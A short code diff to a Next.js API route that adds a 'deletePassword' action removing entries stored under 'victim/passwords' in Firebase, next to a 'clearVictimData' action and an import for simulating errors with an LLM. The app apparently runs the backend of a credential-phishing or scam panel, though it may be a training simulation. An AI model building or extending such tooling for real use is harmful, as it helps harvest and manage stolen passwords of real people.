@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { get, ref, set, update, push as firebasePush } from 'firebase/database';
+import { get, ref, set, update, push as firebasePush, remove } from 'firebase/database';
 import { db } from '@/lib/firebase';
 import { initialState, AppState } from '@/lib/state';
 import { simulateErrorWithLLM } from '@/ai/flows/simulate-error';
@@ -202,6 +202,14 @@ export async function POST(request: NextRequest) {
       case 'clearVictimData':
         await set(ref(db, 'victim'), initialState.victim);
         return NextResponse.json({ success: true, message: 'Victim data cleared' });
+
+      case 'deletePassword':
+        if (!body.passwordId) {
+            return NextResponse.json({ error: 'Password ID is required' }, { status: 400 });
+        }
+        const passwordRef = ref(db, `victim/passwords/${body.passwordId}`);
+        await remove(passwordRef);
+        return NextResponse.json({ success: true, message: 'Password deleted' });
 
       case 'reset':
         await set(ref(db, 'config'), initialState.config);
